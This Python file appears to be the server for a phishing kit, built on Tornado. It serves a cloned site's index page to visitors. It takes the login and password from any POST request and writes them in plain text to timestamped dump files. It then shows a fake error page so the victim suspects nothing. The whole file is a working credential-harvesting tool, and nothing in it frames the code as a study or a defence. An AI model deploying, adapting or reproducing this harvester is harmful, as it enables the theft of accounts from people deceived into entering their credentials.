#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import datetime
import logging
from tornado import web
from tools import server, ConfLoader, FileManager


class MainHandler(web.RequestHandler):
    """MainHandler handle root and unknown endpoints

    GET give the index page
    POST try to save login and password and send the error page
    """

    def get(self):
        # TODO doc
        with open(index_file, mode='r', encoding='UTF-8') as file:
            self.write(file.read())

    def post(self):
        # TODO doc
        try:
            login = self.get_argument('login')
            password = self.get_argument('password')
            dump = os.path.join(dump_path, str(datetime.datetime.now()))
            content = 'login:' + login + '\npassword:' + password + '\n'
            FileManager.append_to_file(dump, content)
        except web.HTTPError:   # no or wrong arguments
            logging.warning('Missing argument on MainHandler POST request')
        # then show an error page to the client
        with open(error_file, mode='r', encoding='UTF-8') as page:
            self.write(page.read())


def main():
    """Main function, define an Application and start server instances with it."""
    application = web.Application([
        (r'/rsc/(.*)', web.StaticFileHandler, {'path': rsc_folder_path}),
        (r'/', MainHandler),
        (r'/.*', MainHandler)
    ])
    server.start_server(application)  # start server with this Application and previously loaded parameters


if __name__ == '__main__':
    (website_name, page_folder_path, rsc_folder_path, dump_folder_path) = ConfLoader.load_fish_conf()  # load main conf
    index_file = os.path.join(page_folder_path, website_name, 'index.html')  # determine index page file path
    error_file = os.path.join(page_folder_path, website_name, 'error.html')  # determine error page file path
    dump_path = os.path.join(dump_folder_path, website_name)  # determine website dump folder path
    (log_level, log_file) = ConfLoader.load_log_conf()  # load log conf
    logging.basicConfig(level=log_level, filename=log_file)  # create a logger  # TODO date/time format
    main()  # execute main function
